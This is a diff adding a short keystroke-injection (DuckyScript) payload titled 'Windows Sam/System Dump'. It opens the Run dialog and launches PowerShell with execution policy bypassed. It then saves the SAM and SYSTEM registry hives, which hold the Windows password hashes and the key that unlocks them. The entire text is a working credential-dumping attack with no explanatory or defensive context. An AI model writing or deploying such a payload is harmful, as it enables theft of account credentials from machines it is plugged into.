@@ -1,0 +1,5 @@
+REM Windows Sam/System Dump (Advanced)
+GUI r
+DELAY 200
+STRING powershell -ExecutionPolicy Bypass -Command "reg save HKLM\SAM sam; reg save HKLM\SYSTEM system"
+ENTER
